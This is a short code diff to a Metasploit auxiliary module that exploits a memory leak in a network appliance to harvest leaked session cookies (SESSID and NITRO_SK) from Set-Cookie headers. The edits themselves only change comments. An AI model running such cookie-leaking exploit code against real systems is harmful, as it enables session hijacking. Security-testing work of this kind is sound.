@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     # We track the number of bytes we leak to report back to teh user and help determine if we triggered the vuln or not.
     leaked_data_count = 0
 
-    # We use a set to track the unique leaked cookies, so we dont report leaking the same cookie numerous times.
+    # We use a set to track the unique leaked cookies, so we don't report leaking the same cookie numerous times.
     found_cookies = Set.new
 
     # As we cannot control what we leak, we hit the vuln up to LEAK_REQUEST_COUNT times and hope that we leak
@@ -113,6 +113,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # The leaked data comes back to us in a Set-Cookie header, so we bail out early if no cookies are returned.
       # This will handle a patched appliance.
+      # Note: A patched system will not return any cookie values.
       cookies = res.get_cookies
       if cookies.empty?
         vprint_error("#{peer} - Response has no cookies")
@@ -134,8 +135,6 @@ class MetasploitModule < Msf::Auxiliary
 
         bytes = Rex::Text.decode_base64(v)
 
-        # A patched system will not return a base64 encoded NSC_TASS value, so if we can decode it, it's a strong
-        # indicator of a vulnerable system. Even if the memory we leak doesn't contain session cookies.
         leaked_data_count += bytes.bytesize
 
         # Detect the SESSID and optional NITRO_SK cookie pair. The SESSID value is a hex string, while the NITRO_SK
